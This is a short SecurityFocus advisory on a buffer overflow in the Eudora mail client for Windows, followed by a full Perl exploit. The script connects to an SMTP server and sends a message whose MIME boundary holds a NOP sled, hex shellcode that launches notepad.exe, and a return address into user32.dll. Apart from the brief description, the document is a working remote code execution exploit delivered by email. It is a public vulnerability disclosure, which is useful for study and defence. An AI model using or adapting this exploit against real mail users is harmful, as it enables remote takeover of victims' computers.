source: http://www.securityfocus.com/bid/5397/info

A buffer overflow vulnerability has been reported in Qualcomm's Eudora mail client for Windows systems. The condition occurs if a MIME multipart boundary is of excessive length. Remote attackers may exploit this vulnerability to execute arbitrary code.

#!/usr/local/bin/perl

#---------------------------------------------------------------------
# Eudora Version 5.0.2-Jr2 exploit for Japanese Windows 2000 Pro (SP2)
# written by Kanatoko <anvil@jumperz.net>
# http://www.jumperz.net/
#---------------------------------------------------------------------

use Socket;

$connect_host   = 'mail.jumperz.net';
$port           = 25;
$env_from       = 'anvil@jumperz.net';
$env_to         = 'target@jumperz.net';
$from           = 'anvil@jumperz.net';
$to             = 'target@jumperz.net';

$iaddr = inet_aton($connect_host) || die "Host Resolve Error.\n";
$sock_addr = pack_sockaddr_in($port,$iaddr);
socket(SOCKET,PF_INET,SOCK_STREAM,0) || die "Socket Error.\n";
connect(SOCKET,$sock_addr) || die "Connect Error\n";
select(SOCKET); $|=1; select(STDOUT);

        #egg written by UNYUN (http://www.shadowpenguin.org/)
        #57bytes
$egg  = "\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2";
$egg .= "\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7";
$egg .= "\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C";
$egg .= "\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB";
$egg .= "\xFD\xE8\xD4\xFF\xFF\xFF";
$egg .= "notepad.exe";

$buf  = "\x90" x 121;
$buf .= $egg;
$buf .= "\xEB\xA0"; #JMP -0x60
$buf .= "A" x 2;
$buf .= "\x97\xAC\xE3\x77"; #0x77e3ac97 JMP EBX in user32.dll

$hoge = <SOCKET>;
print SOCKET "HELO hoge\x0D\x0A";
$hoge = <SOCKET>;
print SOCKET "MAIL FROM:<$env_from>\x0D\x0A";
$hoge = <SOCKET>;
print SOCKET "RCPT TO:<$env_to>\x0D\x0A";
$hoge = <SOCKET>;
print SOCKET "DATA\x0D\x0A";
$hoge = <SOCKET>;

print SOCKET << "_EOD_";
MIME-Version: 1.0\x0D
>From: $from\x0D
To: $to\x0D
Content-Type: multipart/mixed; boundary="$buf"\x0D
\x0D
.\x0D
_EOD_
$hoge = <SOCKET>;
print SOCKET "QUIT\x0D\x0A";
$hoge = <SOCKET>;